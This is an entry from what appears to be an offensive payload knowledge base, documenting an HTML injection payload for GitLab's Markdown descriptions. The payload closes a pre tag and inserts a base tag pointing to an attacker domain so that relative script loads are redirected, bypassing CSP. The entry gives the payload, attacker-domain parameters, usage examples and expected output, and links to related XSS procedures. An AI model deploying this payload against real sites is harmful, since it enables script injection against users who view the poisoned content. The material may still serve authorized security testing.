---
data: >-
  <pre data-sourcepos="\"%22 href=\"x\"></pre><base
  href=https://joaxcar.com><pre x=\"\"><code></code></pre>
tags:
  - xss
  - injection
type: command
output: 'Payload stored in Markdown field, redirects relative URLs on render'
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.810Z'
id: 2b89d7aa-89bb-46d8-90c4-186b78d29f46
verified: false
validated: true
submitted: true
---
# inject-base-tag-payload

## Command

```html
<pre data-sourcepos="\"%22 href=\"x\"></pre><base href=https://joaxcar.com><pre x=\"\"><code></code></pre>
```

## Description

Injects HTML into GitLab's Markdown description to close an existing <pre> tag, insert a <base> href pointing to the attacker domain, and balance parsing, enabling redirection of relative script loads for CSP bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| domain | Attacker domain (e.g., joaxcar.com) | Yes |

## Examples

### Basic Usage

```html
<pre data-sourcepos="\"%22 href=\"x\"></pre><base href=https://attacker.com><pre x=\"\"><code></code></pre>
```

### Advanced Usage

Replace domain and add closing elements for specific contexts.

## Expected Output

No immediate errors; on render, <base> influences resource resolution, visible as failed loads in DevTools.

## Related

- [[commands/test-multiple-xss-vectors]]
- [[procedures/Inject-XSS-Payload-into-Issue-Description]]
